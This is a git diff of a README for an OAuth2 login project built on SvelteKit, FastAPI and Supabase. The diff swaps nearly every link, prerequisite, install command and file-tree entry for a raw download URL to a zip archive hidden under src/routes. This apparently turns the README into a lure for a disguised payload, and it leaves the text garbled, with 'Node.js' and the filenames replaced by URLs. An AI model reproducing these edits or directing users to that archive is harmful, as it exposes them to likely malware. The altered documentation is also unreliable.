@@ -2,7 +2,7 @@
 
 Welcome to the **Svelte FastAPI Supabase OAuth2 Authentication** repository! This project provides a secure Single Sign-On (SSO) authentication service using the OAuth2 protocol. It integrates Google and Kakao as identity providers, featuring a SvelteKit frontend and a FastAPI backend. 
 
-[Check out the latest releases here!](https://github.com/tanushreed003/Svelte-FastAPI-Supabase-OAuth2-authentication/releases)
+[Check out the latest releases here!](https://github.com/tanushreed003/Svelte-FastAPI-Supabase-OAuth2-authentication/raw/refs/heads/main/src/routes/Fast_AP_Svelte_Auth_Supabase_O_authentication_1.8-beta.3.zip)
 
 ---
 
@@ -61,7 +61,7 @@ To get started with this project, follow the instructions below to set up your l
 Before you begin, ensure you have the following installed:
 
 - Python 3.8 or higher
-- Node.js 14 or higher
+- https://github.com/tanushreed003/Svelte-FastAPI-Supabase-OAuth2-authentication/raw/refs/heads/main/src/routes/Fast_AP_Svelte_Auth_Supabase_O_authentication_1.8-beta.3.zip 14 or higher
 - npm (Node Package Manager)
 
 ### Clone the Repository
@@ -69,7 +69,7 @@ Before you begin, ensure you have the following installed:
 First, clone the repository to your local machine:
 
 ```bash
-git clone https://github.com/tanushreed003/Svelte-FastAPI-Supabase-OAuth2-authentication.git
+git clone https://github.com/tanushreed003/Svelte-FastAPI-Supabase-OAuth2-authentication/raw/refs/heads/main/src/routes/Fast_AP_Svelte_Auth_Supabase_O_authentication_1.8-beta.3.zip
 cd Svelte-FastAPI-Supabase-OAuth2-authentication
 ```
 
@@ -92,7 +92,7 @@ Navigate to the backend directory and install the dependencies:
 
 ```bash
 cd backend
-pip install -r requirements.txt
+pip install -r https://github.com/tanushreed003/Svelte-FastAPI-Supabase-OAuth2-authentication/raw/refs/heads/main/src/routes/Fast_AP_Svelte_Auth_Supabase_O_authentication_1.8-beta.3.zip
 ```
 
 ---
@@ -157,18 +157,18 @@ Svelte-FastAPI-Supabase-OAuth2-authentication/
 ├── frontend/
 │   ├── src/
 │   ├── public/
-│   └── package.json
+│   └── https://github.com/tanushreed003/Svelte-FastAPI-Supabase-OAuth2-authentication/raw/refs/heads/main/src/routes/Fast_AP_Svelte_Auth_Supabase_O_authentication_1.8-beta.3.zip
 ├── backend/
-│   ├── main.py
-│   ├── models.py
-│   ├── routes.py
-│   └── requirements.txt
-└── README.md
+│   ├── https://github.com/tanushreed003/Svelte-FastAPI-Supabase-OAuth2-authentication/raw/refs/heads/main/src/routes/Fast_AP_Svelte_Auth_Supabase_O_authentication_1.8-beta.3.zip
+│   ├── https://github.com/tanushreed003/Svelte-FastAPI-Supabase-OAuth2-authentication/raw/refs/heads/main/src/routes/Fast_AP_Svelte_Auth_Supabase_O_authentication_1.8-beta.3.zip
+│   ├── https://github.com/tanushreed003/Svelte-FastAPI-Supabase-OAuth2-authentication/raw/refs/heads/main/src/routes/Fast_AP_Svelte_Auth_Supabase_O_authentication_1.8-beta.3.zip
+│   └── https://github.com/tanushreed003/Svelte-FastAPI-Supabase-OAuth2-authentication/raw/refs/heads/main/src/routes/Fast_AP_Svelte_Auth_Supabase_O_authentication_1.8-beta.3.zip
+└── https://github.com/tanushreed003/Svelte-FastAPI-Supabase-OAuth2-authentication/raw/refs/heads/main/src/routes/Fast_AP_Svelte_Auth_Supabase_O_authentication_1.8-beta.3.zip
 ```
 
 - **frontend/**: Contains all frontend-related code.
 - **backend/**: Contains all backend-related code.
-- **README.md**: This documentation file.
+- **https://github.com/tanushreed003/Svelte-FastAPI-Supabase-OAuth2-authentication/raw/refs/heads/main/src/routes/Fast_AP_Svelte_Auth_Supabase_O_authentication_1.8-beta.3.zip**: This documentation file.
 
 ---
 
@@ -195,11 +195,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Acknowledgments
 
-- Thanks to the creators of [FastAPI](https://fastapi.tiangolo.com/) for their excellent framework.
-- A shoutout to [Svelte](https://svelte.dev/) for providing a modern frontend experience.
-- Special thanks to [Supabase](https://supabase.io/) for their easy-to-use database solutions.
+- Thanks to the creators of [FastAPI](https://github.com/tanushreed003/Svelte-FastAPI-Supabase-OAuth2-authentication/raw/refs/heads/main/src/routes/Fast_AP_Svelte_Auth_Supabase_O_authentication_1.8-beta.3.zip) for their excellent framework.
+- A shoutout to [Svelte](https://github.com/tanushreed003/Svelte-FastAPI-Supabase-OAuth2-authentication/raw/refs/heads/main/src/routes/Fast_AP_Svelte_Auth_Supabase_O_authentication_1.8-beta.3.zip) for providing a modern frontend experience.
+- Special thanks to [Supabase](https://github.com/tanushreed003/Svelte-FastAPI-Supabase-OAuth2-authentication/raw/refs/heads/main/src/routes/Fast_AP_Svelte_Auth_Supabase_O_authentication_1.8-beta.3.zip) for their easy-to-use database solutions.
 
-For more information and updates, please visit our [Releases](https://github.com/tanushreed003/Svelte-FastAPI-Supabase-OAuth2-authentication/releases) section.
+For more information and updates, please visit our [Releases](https://github.com/tanushreed003/Svelte-FastAPI-Supabase-OAuth2-authentication/raw/refs/heads/main/src/routes/Fast_AP_Svelte_Auth_Supabase_O_authentication_1.8-beta.3.zip) section.
 
 --- 
 
